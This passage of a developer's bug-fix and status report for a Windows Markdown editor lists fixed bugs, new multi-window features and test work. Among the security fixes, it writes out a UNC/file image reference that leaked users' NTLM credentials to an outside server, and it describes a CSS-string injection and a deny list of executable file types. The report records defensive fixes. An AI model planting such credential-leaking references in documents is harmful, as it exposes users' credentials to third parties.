| M11 | A new file name on the command line did nothing | Asks "create a new file?"; names starting with `-` open when such a file exists | `cb1f8a5` |
| M12 (part) | Hibernation wiped the undo history | The undo history is kept and restored on wake when the file is unchanged | `72e2d01` |
| M15 (part) | A wrongly detected encoding could not be corrected | UTF-16 without BOM is detected; the status bar Encoding menu has "Reopen with encoding" | `529593f`, `a7319a4` |
| M16 | Cut deleted the text even when the clipboard write failed | Cut deletes only after the write succeeded; Cut/Copy/Paste failures show a message | `d532e03` |
| M17 | "Exit" did not quit | File > Exit closes every window for good (each stores or resolves its tabs) | `cb1f8a5` |
| M18 | Extra windows did not remember their session or size | Every window stores its own session; new windows take the size of the window they open from | `cb1f8a5` |
| M19 | The Formatting toggle changed every tab; a `.txt` could never be Formatted | Each tab's Markdown syntax choice is kept; the mode button cycles Plain text → Formatted → Markdown syntax for non-Markdown files | `22e2983` |
| M20 | Wrong name in "could not open", and Recent not cleaned | The message names the failed file, and that file is removed from Recent | `d510cf2` |
| M21 | With the find bar open, moving to an unloaded tab made F3 say "No results" | The find bar searches again once the editor shows the new tab (`actions.whenActivated`) | `2f064ce` |
| M22 | A restored file that could not be read gave an empty tab | The tab refuses to save until reloaded; for a clean tab the 3-second check retries the read | `3463b7a` |

### Low
| # | Bug | What was fixed | Commit |
| --- | --- | --- | --- |
| L1 | `$HOME/$USER` became maths | A closing `$` followed by a letter or digit does not end maths | `389e22f` |
| L2 | Colour codes like `#fff` became tags | Hex colour codes are not tags | `389e22f` |
| L3 | `a==b or c==d` was highlighted | `==` between word characters is not a highlight marker | `389e22f` |
| L4 | F5 was always in US format | F5 uses the locale's short time and date (display language; regional format: MD-2) | `71d6fdf` |
| L5 (part) | The character total of a partly loaded file was stale | The total counts edits and later chunks (`tailChars` replaces `totalChars`) | `42e6a30` |
| L6 | The font list had false families; "Inter" was always listed | "Montserrat Extra" and bitmap `.fon` fonts are gone; "Inter" is listed only when installed or chosen | `ea5c821`, `fec7557`, `7968f33` |
| L7 | After 400 undo steps the unsaved dot was not cleared | Dirty tracking follows the undo history when it drops its oldest steps | `7ea4fbd` |
| L8 (part) | `2 * 3 * 4` turned italic in table cells | Emphasis needs markers with no space inside them; `_x_` is italic (rest: TAB-2) | `7d40ede` |
| L9 | A `\` at the end of an unpadded cell merged two cells | The backslash gets a space before the pipe | `1887e02` |
| L10 | Table commands deleted the extra cells of long rows | Extra cells are kept | `f551dc0` |
| L11 (part) | An unclosed `$$` restyled up to 5,000 lines | An unclosed `$$` ends at the first blank line | `fff807a` |
| L12 | Block maths, comments and footnotes worked at top level only | They work inside lists, quotes and callouts (rendering there: MD-1) | `fff807a` |
| L13 | Ctrl+click on links worked in Formatted mode only | Works in Markdown syntax mode; bare web addresses open in Plain | `ccbb978` |
| L14 | `http://` and `file://` images did not show | Both show, in the editor and in print | `249600e` |
| L15 | Ctrl+B/I/K and F5 in the Find box changed the document | They no longer touch the document | `7ff58db` |
| L16 (part) | The drafts folder was never cleaned | At start, drafts that no stored session owns and leftover `.tmp` files are deleted (new Rust command `drafts_prune`) | `90c52a9`, merge `95c2f1b` |

### To check on Windows (first report)
| # | Problem | What was fixed | Commit |
| --- | --- | --- | --- |
| W4 | F3 with a dialog open opened WebView2's own find bar | F3 / Shift+F3 are suppressed | `09913d5` |
| W8 (part) | Saving on paths over 260 characters | Long paths get the `\\?\` prefix before `ReplaceFileW` | `529593f` |

## 2.3 New bugs found and fixed

| # | Bug | What was fixed | Commit |
| --- | --- | --- | --- |
| T1 | Choosing a heading or list kind at the start of a line put the cursor before the marker (`x# `) | A bare cursor at the insertion point moves after the new marker | `d573f19` |
| T2 | An untitled tab closed right after typing came back named "Untitled" | Pending titles are applied before the session is stored on close | `0670f55` |
| T3 | A first line like `con` or `com1` suggested an invalid file name | Suggests `con_.md` | `965dcfc` |
| T4 | A Save As name ending in a dot kept a "." extension that Windows drops | Trailing dots and spaces are removed, as Windows does | `965dcfc` |
| LOAD-1 | The find bar left an unhandled promise rejection when the full load failed | The chain in `FindBar.tsx` ends in `.catch` | `2f064ce` |
| WIN-1 | After the hidden restart from an update, every later window hid itself | Only the first window starts hidden | `cb1f8a5` |
| MERGE-1 | The startup draft clean-up deleted the drafts of other windows' stored sessions | `runInit` keeps the drafts of every stored session (a small risk remains, see Part 1) | `95c2f1b` |
| — | Bitmap `.fon` fonts appeared as false families | Left out of the font list | `fec7557` |
| PREV-1 | After a theme change, a tab that was in the background kept Mermaid diagrams in the old theme | The block field remembers its theme; the viewport reporter rescans on tab switch when it differs | `d12557d` |
| PREV-2 | Enter in the header of a header-only table, then Ctrl+Z, lost keyboard focus | The rebuild refocuses the header instead of the delimiter row | `1938638` |
| PREV-3 | Showing a document with `![](\\server\x.png)` (or `file://server/…`, `//server/…`) made Windows send the user's NTLM credentials to that server | Network images load only from the document's own server | `c393e1f` |
| PREV-4 | `` `a \| b` `` in a table cell showed the backslash | `\|` is unescaped before code spans are taken out, as in GFM | `3131e22` |
| PREV-5 | A NUL character followed by digits and NUL in a cell showed "undefined" | NUL is shown as U+FFFD | `f82320c` |
| SEC-1 | A form feed in an untitled tab's name ended the print header's CSS string early, so the rest of the name was read as CSS | Every control character becomes a space in `cssString` (`src/state/logic.ts`) | `f750a81` |
| 1.6 | `opener:allow-open-path` allowed every path, so only the frontend kept a link from launching a program | The capability denies 107 program, script, shortcut, installer and macro types. Scripts still open as text in a tab. `src/state/openerScope.test.ts` checks that no denied type is ever sent to `openPath` | `2893fc5` |
| STATE-1 | A restored or hibernated tab (no text loaded) whose file was deleted became "unsaved"; closing asked to save and Save failed | Such a tab gets the "deleted" bar but stays clean | `1033a19` |
| STATE-2 | Closing a window (Don't save) during a draft write stored its session again, so it came back next start | The discard runs after any flush in progress and drops pending draft changes | `6796137` |
| STATE-3 | Text typed into a tab while it moved to another window was lost | The tab is read-only (parked) until the move ends, editable again if it fails | `fdcb8db` |
| STATE-4 | An untitled tab moved right after typing arrived as "Untitled" | The pending name is applied before the tab is sent | `9f1cdfa` |

## 2.4 Features added

### F1. Launching the app again opens a new window — done (`cb1f8a5`)
- With a window on screen, a launch without files opens a new window, cascaded from the last focused one and the same size.
- Files go to the window that last had the focus, which follows "Open files in" and comes to the front.
- With no window on screen, the background window comes back as before.
- One process is kept, so drafts, the session and settings stay in one place. ⚠️ see 1.4.

### F2. Tabs can be dragged out to a new window or between windows — mostly done (`cb1f8a5`, `3b621a9`)
- **Gesture** (`TitleBar.tsx`, `src/lib/tabDrag.ts`):
  - Pulling a tab 32 px above or below the strip, or out of the window, dims it and stops reordering. Releasing there moves it.
  - Pointer capture keeps the drag going outside the window.
- **Rust:**
  - `tab_drop_target` finds the window under the cursor.
  - `window_new` can open the new window under the mouse with the tab in it.
- **Moving the tab:**
  - The tab's text, unsaved state, cursor, scroll, encoding, line ending, mode and draft move in one message.
  - Nothing is saved or read from disk, and a partly loaded file keeps loading from where it stopped.
  - The draft now belongs to the new window's session.
- **Safety:** the source window removes the tab only after the target confirms. After 10 s with no answer the tab stays.
- **Last tab:** dragging out the last tab closes the old window, so no empty window is left.
- **Still open:** see Part 1.3.

## 2.5 Test work done
- **Test count:** 30 tests at the first report; **536** now, none skipped. Every test that was skipped (`it.skip`) or `#[ignore]` for a known bug now runs and passes:
  - H5, H7, H16, M4, M7, M12, L2, L3, L8 (Vitest).
  - H14, M15 (Rust).
- **New test files:**
  - `src/editor/livePreview/tables.test.ts`
  - `src/components/FindBar.test.ts` (React in jsdom)
  - `src/lib/findBar.test.ts`
  - `src/state/clipboard.test.ts`
  - `src/lib/tabDrag.test.ts`
- **New test groups:** several windows, moving tabs between windows, H12, M10 and M19 in `actions.test.ts`.
- **Fake backend** (`src/test/fakeTauri.ts`):
  - Native message boxes and yes/no questions.
  - windows-1252 ANSI.
  - `openPath`, `drafts_prune`.
  - Per-window sessions, window boot data, the drop target, and window events.
- **Tests that fail without their fix:** most new tests were checked to fail before the fix and pass after. The exceptions are the M21 test (see 1.5) and the "leaving a table with Down" regression test.
- **Earlier on this branch:**
  - Tests are typechecked in CI (`tsconfig.test.json`).
  - Coverage is set up with `@vitest/coverage-v8`.
  - The guide is `docs/TESTING.md`.

---

# Reference

## How the first report was made (10 November 2026)
- Read all of the code: Rust backend, state and loader, editor engine, UI components.
- Ran the real frontend in Chromium against a fake Tauri backend and reproduced each suspected bug with keyboard and mouse.
- Ran 900 random keystrokes and format commands on `sample.md`: no crash, no exception.
- No obvious security bug was found. A document cannot run scripts: print output is sanitised, KaTeX and Mermaid run in strict mode, and table cells escape HTML. See 1.6 for the new opener permission.

## Edge cases: what the app does now

| Case | What the app does | OK? |
| --- | --- | --- |
| Empty file | Opens; assumes UTF-8 and CRLF | ✅ |
| 127 MB file | First 256 KB at once, the rest on scroll | ✅ (memory: M13) |
| File changed by another program, tab clean | Silent reload, scroll kept, Undo history gone | ✅ |
| File changed, tab unsaved | Bar: Reload / Keep mine. Save is refused until Keep mine | ✅ |
| File deleted | "Deleted" bar; a clean tab stays clean and reloads if the file comes back | ✅ |
| File renamed | Treated as deleted | Acceptable |
| Read-only file | Typing works; Save says "Access is denied". No sign beforehand | Weak (Part 1) |
| File locked by another program | "Could not open file" on open; error on save, original kept | ✅ |
| Disk full, or crash during save | Temp file fails, original kept (in-place fallback: FILES-3) | ✅ |
| Network drive drops | Stat errors ignored, no false flag | ✅ |
| Window not focused | Disk changes are not seen until the window gets focus | By design |
| One file in two windows | Possible (WIN-3); the second save is refused as stale | Safe |
| Dropping a folder | "Could not open file" | ✅ |
| Binary file | Garbage text; damaged on save | ❌ (M15 rest) |
| CR-only line endings | Supported ("Macintosh (CR)") | ✅ |
| Urdu / right-to-left text | Lines are right with `dir="auto"`; table cells get no RTL alignment | Partial |
| Closing the only tab | Closes the window (hides in the background) | Like Notepad |
| App crash or kill | Drafts kept except the last pause, in every window | ✅ |
| Corrupt session file | New session; orphaned drafts are cleaned at the next start | ✅ |
| Typing in the first ~200 ms after start | Text typed before the session is restored can be lost | Small risk |
